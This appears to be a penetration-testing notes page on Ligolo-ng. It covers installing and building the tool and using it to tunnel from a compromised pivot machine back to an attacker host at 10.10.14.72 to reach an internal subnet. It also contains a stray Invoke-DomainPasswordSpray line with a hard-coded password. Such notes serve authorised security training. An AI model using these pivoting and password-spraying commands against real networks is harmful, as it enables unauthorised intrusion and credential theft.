---
title: Ligolo
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentest
  - tunelling
---
# Ligolo

## Installation

Requirements: go.

```
sudo apt install ligolo-ng
```


Or: 

```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
tar -xvf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
tar -xvf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

Or:

```
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng

# And finally you can compile your proxy binary:
go build -o proxy cmd/proxy/main.go
go build -o agent cmd/agent/main.go

#  change the binary in order to be executable:
chmod +x ./agent
chmod +x ./proxy
```


## Basic usage

First, we need to create a tun interface:

```
sudo ip tuntap add user lala mode tun ligolo
sudo ip link set ligolo up
```

Second, start the proxy:

```
./proxy -selfcert

```

Third, connect the agent (in the pivot machine) to our proxy in the kali:

```
./agent -connect 10.10.14.72:11601 --ignore-cert

```

Once you start the proxy, it listens on the port “11601” by default. So when you connect to your proxy, you need to specify your IP and that default port (unless other configurations are in place).

Commands in ligolo:

```
# List available sessions
session
# To enter one of them, enter the number they have.

# List interfaces:
ifconfig

# Add a route to the new interface (in a new kali terminal)
sudo ip route add 172.16.139.0/24 dev ligolo



Invoke-DomainPasswordSpray -Password '!QAZXCFGHJKOP' -OutFile spray_success -ErrorAction SilentlyContinue
```


## Building versions

### agent.exe for windows architexture x86

```
cd ligolo-ng/cmd/agent
GOOS=windows GOARCH=386 go build -o agent_x86.exe main.go
```


### proxy for linux architexture amd64

```
cd ligolo-ng/cmd/proxy
GOOS=linux GOARCH=amd64 go build -o proxy main.go
```